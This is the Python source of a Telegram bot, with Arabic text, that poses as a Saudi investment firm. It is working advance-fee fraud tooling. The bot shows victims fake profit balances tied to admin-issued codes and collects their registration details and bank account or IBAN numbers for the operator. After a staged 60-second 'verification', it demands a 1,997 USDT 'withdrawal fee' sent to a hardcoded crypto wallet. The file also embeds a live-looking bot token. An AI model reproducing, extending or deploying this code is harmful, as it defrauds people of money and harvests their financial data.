import logging
import os
import random
import string
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# التوكن المعتمد للبوت
TOKEN = "9056801472:AAHsVQ8Iwl_pa34_4gAYxakvY5y-r-vEjzU"
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# قاموس لتتبع حالة كل مستخدم
user_states = {}
# قاموس لحفظ بيانات كل مستخدم شخصياً
user_custom_data = {}

# قاعدة بيانات الأكواد والمبالغ المخصصة للمستخدمين
custom_profits = {
    "354101": {"amount": "45,500", "assigned_user_id": None},
    "00554": {"amount": "45,500", "assigned_user_id": None},
    "3585556": {"amount": "45,500", "assigned_user_id": None},
    "189415": {"amount": "1500", "assigned_user_id": None}
}
USED_CODES = set()

def generate_new_code() -> str:
    """توليد معرف عملية جديد وعشوائي وآمن يبدأ بـ 354"""
    chars = string.digits
    return "354" + "".join(random.choices(chars, k=6))

# تقدير عمر الحساب بناءً على الـ ID
def estimate_account_age(user_id: int) -> str:
    if user_id < 10000000:
        return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
    elif user_id < 100000000:
        return "حساب قديم (بين 2014 - 2016 تقريباً)"
    elif user_id < 500000000:
        return "حساب متوسط القدَم (بين 2016 - 2019 تقريباً)"
    elif user_id < 1000000000:
        return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
    else:
        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"

# أمر الأدمن لتحديد المبلغ ورقم التحقق لزبون معين بدقة:
async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
            "اكتب الأمر بهذا الشكل:\n"
            "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
            "مثال:\n`/setprofit 7004113433 45500 3585556`",
            parse_mode="Markdown"
        )
        return

    target_user_id = args[0].strip()
    amount = args[1].strip()
    code = args[2].strip()

    custom_profits[code] = {
        "amount": amount,
        "assigned_user_id": int(target_user_id)
    }

    await update.message.reply_text(
        f"✅ **تم تخصيص الأرباح ورقم التحقق بنجاح!**\n\n"
        f"• معرف المستخدم: `{target_user_id}`\n"
        f"• الرصيد/الأرباح: `{amount} ريال`\n"
        f"• رقم التحقق الخاص به: `{code}`\n\n"
        "🔒 هذا الرقم مرتبط به وحده ولا يمكن لأي شخص آخر استخدامه.",
        parse_mode="Markdown"
    )

# أمر عرض الأكواد والمراجع الفعّالة للأدمن
async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
    await update.message.reply_text(
        f"🔑 **أكواد التحقق الفعّالة ومبالغها الحالية:**\n`{codes_str}`",
        parse_mode="Markdown"
    )

# أمر /start الترحيبي مع مسح الكيبورد القديم نهائياً
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_states[user_id] = "waiting_for_subscription_text"
    
    age_estimation = estimate_account_age(user_id)
    
    welcome_msg = (
        f"🌟 أهلاً بك في شركة **تحالف المالية للإستثمار** 🇸🇦\n"
        f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
        f"📊 معلومات حسابك:\n"
        f"• معرفك الشخصي (ID): `{user_id}`\n"
        f"• تقدير الحساب: {age_estimation}\n\n"
        f"الرجاء إرسال بياناتك صحيحة (خطوات التسجيل والإشتراك) ليتم التعرف عليك في النظام."
    )
    
    await update.message.reply_text(
        welcome_msg, 
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )

# معالجة الصور (إيصالات دفع الرسوم المرفوعة من الزبون)
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "بدون معرف"
    
    if not update.message.photo:
        return

    photo = update.message.photo[-1]

    await update.message.reply_text(
        "📸 **تم استلام صورة الوصل (الإيصال) بنجاح!**\n\n"
        "جاري مراجعة وتأكيد عملية دفع الرسوم من قبل الإدارة. شكراً لك!",
        parse_mode="Markdown"
    )

    # أزرار الأدمن تحت صورة الوصل (تم الدفع / رفض العملية)
    keyboard = [
        [
            InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
            InlineKeyboardButton("❌ تم رفض العملية", callback_data=f"admin_reject_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    admin_caption = (
        "📥 **إيصال دفع رسوم سحب جديد تم رفعه من مستخدم!**\n\n"
        f"👤 اسم المستثمر: {user.first_name}\n"
        f"🆔 معرف المستخدم: `{user_id}`\n"
        f"🔗 يوزر الحساب: {username}\n\n"
        "يرجى مراجعة الإيصال والضغط على أحد الأزرار أدناه:"
    )
    try:
        await context.bot.send_photo(
            chat_id=ADMIN_ID, 
            photo=photo.file_id, 
            caption=admin_caption, 
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"فشل إرسال صورة إيصال الرسوم للأدمن: {e}")

# معالجة الرسائل النصية
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return

    user_id = update.effective_user.id
    username = f"@{update.effective_user.username}" if update.effective_user.username else "بدون معرف"
    text = msg.text.strip()
    current_state = user_states.get(user_id)

    if current_state == "completed":
        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
        return

    # الحالة الأولى: استقبال بيانات التسجيل
    if current_state == "waiting_for_subscription_text":
        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك") or text.startswith("حساب") or len(text) > 10:
            user_custom_data[user_id] = text
            user_states[user_id] = "waiting_for_code"
            
            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم تحقق الاشتراك** الخاص بك لتتمكن من رؤية رصيدك وأرباحك:")
        else:
            await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
        return

    # الحالة الخاصة بإدخال الحساب البنكي (عندما يرسله الزبون)
    if current_state == "waiting_for_bank_account":
        user_states[user_id] = "completed"
        
        # أزرار تأكيد السحب وإلغاء السحب تظهر في الرسالة الأخيرة بعد إرسال الحساب
        keyboard = [
            [
                InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
                InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await msg.reply_text(
            "💳 **إدخال الحساب البنكي:**\n\n"
            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        
        # إشعار للأدمن بالحساب البنكي المدخل
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "🏦 **تم إدخال الحساب البنكي من قبل مستخدم!**\n\n"
                f"• معرف المستخدم: `{user_id}` ({username})\n"
                f"• تفاصيل الحساب البنكي:\n{text}"
            ),
            parse_mode="Markdown"
        )
        return

    # الحالة الثانية: التحقق من رقم التحقق المدخل من الزبون
    if current_state == "waiting_for_code" or text in custom_profits:
        if text in custom_profits:
            code_info = custom_profits[text]
            assigned_id = code_info["assigned_user_id"]
            
            if assigned_id is not None and assigned_id != user_id:
                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك ولا يمكنك استخدامه.")
                return

            profit_amount = code_info["amount"]

            # حرق الكود واستبعاده فوراً
            del custom_profits[text]
            USED_CODES.add(text)
            user_states[user_id] = "viewing_balance"
            
            # توليد رقم تحقق جديد للأدمن
            auto_new_code = generate_new_code()
            custom_profits[auto_new_code] = {"amount": "2000", "assigned_user_id": None}

            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "🔑 **تم استهلاك رقم تحقق وإصدار رقم جديد!**\n\n"
                    f"• الرقم المستهلك (المحروق): `{text}`\n"
                    f"• بواسطة المستخدم: `{user_id}` ({username})\n\n"
                    f"🆕 **رقم التحقق الجديد المتجدد لتسليمه للزبون القادم:**\n`{auto_new_code}`"
                ),
                parse_mode="Markdown"
            )

            # زر "ادخل حسابك البنكي" فقط في رسالة الرصيد
            keyboard = [
                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")

            await msg.reply_text(
                text=(
                    "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
                    f"💰 **رصيدك وأرباحك المتاحة:** `{profit_amount} ريال`\n\n"
                    f"إليك بياناتك المسجلة:\n\n{user_specific_data}"
                ),
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await msg.reply_text("❌ رقم التحقق غير صحيح أو تم استخدامه مسبقاً. يرجى مراجعة الدعم الفني للحصول على رقم صحيح.")
        return

# معالجة الأزرار التفاعلية
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data  
    chat_id = query.message.chat_id
    user = query.from_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "بدون معرف"

    # معالجة أزرار الأدمن الخاصة بقبول أو رفض الإيصال
    if data.startswith("admin_approve_") or data.startswith("admin_reject_"):
        if user_id != ADMIN_ID:
            await query.answer("هذا الإجراء مخصص للأدمن فقط!", show_alert=True)
            return

        parts = data.split("_")
        action = parts[1]  # approve أو reject
        target_user_id = int(parts[2])

        if action == "approve":
            # إرسال رسالة نجاح السحب للزبون
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب أرباحك بنجاح.** جاري تحويل المبلغ إلى حسابك البنكي.",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"فشل إرسال رسالة القبول للزبون: {e}")

            await query.edit_message_caption(
                caption=query.message.caption + "\n\n✅ **[تمت الموافقة على الدفع وتأكيد السحب]**",
                parse_mode="Markdown"
            )

        elif action == "reject":
            # إرسال رسالة الرفض للزبون
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="❌ **عذراً، تم رفض العملية لعدم قيامك بتحويل المبلغ المطلوب أو عدم صحة الوصل.** يرجى التأكد وإعادة المحاولة.",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"فشل إرسال رسالة الرفض للزبون: {e}")

            await query.edit_message_caption(
                caption=query.message.caption + "\n\n❌ **[تم رفض العملية ولم يتم دفع المبلغ]**",
                parse_mode="Markdown"
            )
        return

    if data == "enter_bank_account":
        user_states[user_id] = "waiting_for_bank_account"
        await query.edit_message_text(
            "💳 **إدخال الحساب البنكي:**\n\n"
            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
            parse_mode="Markdown"
        )

    elif data == "withdraw_cancel":
        user_states[user_id] = "completed"
        await query.edit_message_text("تم الإلغاء بنجاح")
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ تنبيه: قام المستخدم بإلغاء السحب!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
            parse_mode="Markdown"
        )

    elif data == "withdraw_confirm":
        user_states[user_id] = "completed"
        
        # رسالة مهلة التحقق لمدة 60 ثانية
        await query.edit_message_text(
            "⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع النظام البنكي...**\n\n"
            "الرجاء الانتظار (مهلة التحقق: 60 ثانية)...",
            parse_mode="Markdown"
        )
        
        # الانتظار لمدة 60 ثانية
        await asyncio.sleep(60)

        # زر الدفع المطلوب تحته
        keyboard = [
            [InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # إرسال الرسالة المحدثة الخاصة بتحديث نظام البيانات ورسوم السحب
        await query.edit_message_text(
            "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب وانتهت مهلة 60 ثانية (وظهرت له رسالة دفع الرسوم)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
            parse_mode="Markdown"
        )

    elif data == "pay_fees":
        # تفاصيل دفع الرسوم المطلوبة بالكامل
        pay_details = (
            "💳 **دفع رسوم السحب:**\n\n"
            "العملة: **USDT**\n"
            "المبلغ: **1997 دولار**\n"
            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
            "العنوان:\n"
            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
        )
        await query.edit_message_text(
            pay_details,
            parse_mode="Markdown"
        )

def main():
    if not TOKEN:
        raise ValueError("❌ خطأ: لم يتم تعيين التوكن في الكود!")
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("codes", admin_get_codes))
    app.add_handler(CommandHandler("setprofit", set_profit))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكامل أزرار تحكم الأدمن للرسوم...")
    app.run_polling()

if __name__ == "__main__":
    main()
